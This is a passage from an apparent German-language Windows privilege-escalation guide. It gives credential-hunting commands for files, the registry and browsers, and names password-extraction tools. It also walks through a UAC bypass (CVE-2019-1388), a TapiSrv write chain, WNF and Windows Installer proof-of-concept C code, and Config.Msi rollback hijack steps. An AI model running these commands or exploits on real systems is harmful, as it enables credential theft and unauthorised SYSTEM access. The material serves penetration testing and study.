Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Zugangsdaten im Papierkorb

Du solltest auch den Papierkorb auf Zugangsdaten überprüfen.

Prüfe zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Eintrag und die gelöschte Datei im zugehörigen `$R`-Eintrag. Prüfe die Metadaten und den Lesezugriff der aktuellen Identität, bevor du ein Archiv öffnest. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachte einen Archivnamen als Kandidaten für eine Überprüfung, nicht als Beweis dafür, dass er ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Ansatzpunkt für **code-signing** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser ein geändertes PowerShell-Skript signieren. [PowerShell erfordert ein code-signing-Zertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisherregeln werten die Identität des Signierers und den Regelumfang aus](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Für eine kontenübergreifende Ausführung muss die aktuelle Identität das konkrete Skript ändern können, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptieren und eine geplante Aufgabe oder ein anderer Verbraucher mit höheren Berechtigungen das Skript tatsächlich ausführen. Ein `.pfx`-Dateiname, der Antragstellername eines Zertifikats oder ein beschreibbares Skript allein belegt diese Kette nicht. Überprüfe Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor du Material mit einem privaten Schlüssel öffnest oder die Aufgabe auslöst.

Überprüfe auch zugängliche Profildatenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, manchmal in einem benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Datenvolume ermöglichen, das ältere Backups enthält. Untersuche das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, ist für die Offline-Wiederherstellung von Domänen-Zugangsdaten auch der passende `SYSTEM`-Hive erforderlich, wie im [Workflow für Backups und privilegierte Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänen-Backup vorhanden ist.

Um gespeicherte **Passwörter wiederherzustellen**, kannst du für mehrere Programme Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**OpenSSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Prüfe, ob Datenbanken vorhanden sind, in denen Passwörter aus **Chrome oder Firefox** gespeichert sind.\
Prüfe, ob Datenbanken vorhanden sind, in denen Passwörter aus **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, die Lesezeichen und die Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Für das standardmäßige **Default**-Profil von Edge des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den standardmäßigen Speicherort des Profils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein der Dateien ist lediglich ein Hinweis auf einen möglichen Anmeldedatenspeicher: Bestätige, dass die Dateien lesbar sind, der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ein gespeicherter Login zu einem Konto mit höheren Berechtigungen gehört. Eine reine Pfadaufzählung muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und Dateien mit verschlüsselten Logins sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfe, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor du zu dem Schluss kommst, dass die Anmeldedaten verwendbar sind. Wenn ein wiederhergestellter Anmeldenachweis zu einem Domänenkonto gehört, prüfe separat die effektiven Gruppensteuerungsrechte dieses Kontos und die [Lese- oder Entschlüsselungsrechte der Gruppe für LAPS-Passwörter](../active-directory-methodology/laps.md); Browserartefakte allein belegen keinen Weg zu Administratorrechten.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Das **Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten in verschiedenen Sprachen ermöglicht. Jede COM-Komponente wird durch eine **Klassen-ID (CLSID)** **identifiziert**, und jede Komponente stellt Funktionen über eine oder mehrere Schnittstellen bereit, die durch Schnittstellen-IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind jeweils in der Registry unter **HKEY\CLASSES\ROOT\CLSID** und **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registry findest du den Unterschlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-neutral) sein kann.

![Browserverlauf – COM DLL Overwriting: In den CLSIDs dieser Registry findest du den Unterschlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn du eine der DLLs, die ausgeführt werden sollen, **überschreiben** kannst, könntest du deine **Berechtigungen ausweiten**, sofern diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, findest du hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generische Passwortsuche in Dateien und Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Die Registry nach Schlüsselnamen und Passwörtern durchsuchen**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe, um **automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die auf dieser Seite erwähnte Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) **mit Vollzugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle geöffneten Handles des Hauptprozesses erbt**.\
Wenn du dann **Vollzugriff auf den Prozess mit niedrigen Berechtigungen hast**, kannst du dir das **geöffnete Handle des mit `OpenProcess()` erstellten privilegierten Prozesses** holen und **Shellcode injizieren**.\
[In diesem Beispiel erfährst du mehr darüber, **wie du diese Schwachstelle erkennen und ausnutzen kannst**.](leaked-handle-exploitation.md)\
[In diesem **weiteren Beitrag findest du eine umfassendere Erklärung dazu, wie du weitere geöffnete Handles von Prozessen und Threads testen und missbrauchen kannst, die mit unterschiedlichen Berechtigungsstufen (nicht nur Vollzugriff) vererbt wurden**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speichersegmente, sogenannte **Pipes**, ermöglichen die Kommunikation zwischen Prozessen und die Übertragung von Daten.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht zusammengehörige Prozesse Daten austauschen können, auch über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur mit den Rollen **Named-Pipe-Server** und **Named-Pipe-Client**.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, **die Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachbilden kannst, bietet sich dir die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit deiner eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Außerdem ermöglicht das folgende Tool, **eine Named-Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen, um Privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein remote authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibvorgang** in jede vorhandene Datei umzuwandeln, die für `NETWORK SERVICE` beschreibbar ist. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen vorhandenen beschreibbaren Pfad gesetzt ist → der Dienst öffnet die Datei über `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` aus (`Req_Func 121`), rufe die Daten mit `GetAsyncEvents` ab (`Req_Func 0`) und hebe anschließend die Registrierung auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu und verbinde dich erneut. Rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, die unter Windows etwas ausführen können

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protocol Handlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete, anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, kann es geplante Tasks oder andere Prozesse geben, die **Anmeldedaten über die Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen und vergleicht den aktuellen Zustand mit dem vorherigen. Es gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Benutzeroberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, als nicht privilegierter Benutzer ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ auszuführen.

Dadurch ist es möglich, mit derselben Sicherheitslücke gleichzeitig die Berechtigungen zu erweitern und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in this GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator mit Medium Integrity Level zu High Integrity Level / UAC Bypass

Lies dies, um **mehr über Integrity Levels zu erfahren**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies anschließend **dies, um mehr über UAC und UAC Bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload-Verzeichnis-Junctions in ein ausgeliefertes Root-Verzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer bereitgestellten Dateinamen darin speichern und anschließend die Datei verarbeiten. Wenn ein Benutzer mit geringen Rechten dieses Unterverzeichnis entfernen und durch eine NTFS-Junction ersetzen kann, bevor der serverseitige Schreibvorgang erfolgt, kann der Schreibvorgang der Junction in ein Web-Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibzugriffe; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein belegt dies nicht.

Prüfe die genaue Pfadbildung und den zeitlichen Ablauf im Upload-Handler, die effektiven Lösch- und Erstellungsrechte des Benutzers für das Unterverzeichnis, die effektiven ACLs des Ziels, ob der Writer Reparse Points folgt und ob der Webserver Dateien im Ziel ausführt. Ermittle die Prozessidentitäten des Writers und des Webservers getrennt voneinander. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen späteren Junction-Austausch belegen. Wenn die Ausführung im Kontext eines Dienstkontos erfolgt, prüfe den **tatsächlichen Prozesstoken**, bevor du einen separaten Pfad über Token-Privileges in Betracht ziehst.

## WNF-ausgelöste Bereinigung durch einen privilegierten geplanten Task

Ein geplanter Task, der eine manuelle Ausführung verweigert, kann dennoch einen nicht privilegierten Trigger offenlegen. Exportiere beim Audit eines privilegierten Tasks dessen XML und prüfe **alle** Trigger sowie die Task-DACL, den Principal und die Aktion. Insbesondere gibt ein `WnfStateChangeTrigger` einen Windows Notification Facility (WNF)-Status an. Wenn dieser sicherbare Status es dem aktuellen Benutzer erlaubt, eine Aktualisierung zu veröffentlichen, kann der Benutzer den Task indirekt unter der konfigurierten Identität starten, obwohl `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Beispielsweise lief der Recall-Task `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM, akzeptierte Aktualisierungen des WNF-Status `7508BCA32C079E41` durch einen Standardbenutzer und untersuchte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, löse `ZwUpdateWnfStateData` aus `ntdll.dll` auf, übermittle ein leeres Update für den acht Byte langen Zustandsnamen und setze den Rückgabestatus mit den Daten zum letzten Lauf der Aufgabe oder den Procmon-Aktivitäten in Beziehung. Die folgende reduzierte Probe verwendet die Byte-Sequenz aus dem Recall-Aufgabenbeispiel; ersetze sie durch die für die getestete Aufgabe exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Privilegiertes Löschen durch rekursive Bereinigung

Die nützliche Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolgen Sie den Vorgang von der Auflistung bis zur abschließenden Änderung: Die Ermittlung von Profilen/Sitzungen, per Wildcard ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Hinweise darauf, dass ein zuvor geprüfter Pfad später rekursiv durchlaufen wird. Werden Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnishandles geöffnet und vor dem Löschen validiert, kann ein Angreifer die Pfadauflösung zwischen Auflistung und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombinieren Sie den WNF-Trigger mit der weiter unten beschriebenen [oplock-, Junction- und Object-Manager-Symlink-Substitution](#from-folder-contents-delete-to-system-eop): Der oplock hält die Bereinigungsroutine an, nachdem sie das legitime untergeordnete Element ausgewählt hat. Währenddessen wird der beschreibbare übergeordnete Pfad ersetzt, sodass das fortgesetzte privilegierte Löschen über `\RPC Control` zum geschützten Ziel aufgelöst wird. In der Recall-Kette führte dies zum Löschen von `C:\Config.Msi` durch SYSTEM, das für die dokumentierte MSI-Rollback-Technik erforderlich war.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Fixes

Nur den vom Angreifer kontrollierten Stammordner und sein direktes untergeordnetes Element zu validieren, schützt kein rekursives Löschen per Pfad. Belassen Sie diese geprüften Objekte als legitime Objekte und verlagern Sie die Junction-/oplock-Substitution in ein weiteres untergeordnetes Element darunter; `IFileOperation::DeleteItem` erreicht schließlich den nicht validierten Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständigen Fixes, nachdem der erste Recall-Patch `UKP` und das GUID-förmige Verzeichnis validierte, aber den alten rekursiven Löschvorgang beibehielt.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad/das Objekt abzurufen und zu überprüfen und den Löschstatus auf dieses verifizierte Handle anzuwenden. Validieren Sie kein Präfix, um anschließend wieder zum rekursiven Löschen per Pfad zurückzukehren. Prüfen Sie bei der Patch-Analyse außerdem die Strukturen an der tatsächlichen Aufrufstelle: In diesem Fall zeigte die Laufzeitinspektion von `OBJECT_ATTRIBUTES` bei `NtCreateFile` ein nicht-null `RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde die irreführende Decompiler-Ausgabe widerlegt, die auf eine zweite `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Von beliebigem Löschen/Verschieben/Umbenennen eines Ordners zu SYSTEM-EoP

Die Technik wird [**in diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; ein Exploit-Code ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion des Windows Installers missbraucht, um während der Deinstallation legitime Dateien durch schädliche zu ersetzen. Dazu muss der Angreifer einen **schädlichen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` gekapert wird. Der Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien abzulegen. Diese Rollback-Dateien werden dabei so verändert, dass sie die schädliche Payload enthalten.

### Injektion in den Bereinigungspfad des Windows Installer COM (CVE-2025-27727)

Ein Client mit geringen Rechten kann über das `CMsiConfigurationManager`-COM-Objekt (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Reverse Engineering ergab, dass die relevanten `IMsiServer`-Aufrufe `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50` sind. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können sich zwischen Builds unterscheiden.<sup>[[41]](#references)</sup>

Bei einem Nicht-Administrator impersoniert `SetEEUIDirectoryAndFilter` den Aufrufer nur während des Öffnens des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT`. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann und ein Folgen eines Reparse Points verhindert. Es wird jedoch **nicht** sichergestellt, dass das geprüfte Dateiobjekt an die spätere Bereinigung gebunden ist, noch wird nachgewiesen, dass der Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und die Daten `0x00000002` kennzeichnen den Eintrag als Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der erhöhte Worker listet die Registrierungswerte auf und übergibt Ordner-Einträge an `FDeleteFolder` zur rekursiven Verarbeitung, ohne die Herkunft der Pfade zu prüfen. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` ermittelte minimale Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Pfadwiederverwendung statt einer Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten neu erstellen. Beim Cleanup vertraut Windows Installer dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze durch `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation für vertrauenswürdige Umleitungen umgangen, denn ein Reparse Point ist nicht erforderlich.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt in die folgende Rollback-Kette: Den separaten Eintrag `Installer\Folders` beibehalten, `C:\Config.Msi` löschen, es mit einer NULL DACL neu erstellen und ein Handle mit `WRITE_DAC` offen halten, bevor Windows Installer die DACL verschärft. Über das vorab geöffnete Handle kann mit `NtSetSecurityObject` eine permissive DACL wiederhergestellt werden. Danach lässt sich die generierte `.rbs` ersetzen, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad korrigiert, indem `CMsiTransaction::SetEEUIDirectoryAndFilter` daran gehindert wird, `ScheduleFileOrFolderDelete` aufzurufen, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg melden, fügt den vom Angreifer kontrollierten Pfad aber nicht mehr zu `TempPackages` hinzu. Installiere die Windows-Sicherheitsupdates vom April 2025, statt einen erfolgreichen Methodenaufruf als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Stufe 1 – Vorbereitung des Hijacks (`C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Nicht-Administrator** ihn ausführen kann.
    - Halte nach der Installation ein **Handle** für die Datei offen.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
    - **Überwache das offene Datei-Handle** mithilfe von `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, wenn die `.rbf` geschrieben wurde.
        - Dann auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Wenn das Signal eingeht, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` – dadurch **wird ihr Löschen verhindert**.
    - Signalisiere anschließend zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da sich nicht alle Inhalte löschen lassen, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche als Angreifer die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit für den Hijack.

> An diesem Punkt löst du die Sicherheitslücke aus, die das Löschen beliebiger Ordner auf SYSTEM-Ebene ermöglicht, um `C:\Config.Msi` zu löschen.

2. **Stufe 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **halte ein Handle mit `WRITE_DAC` offen**.

- Schritt 7: Eine weitere Installation ausführen
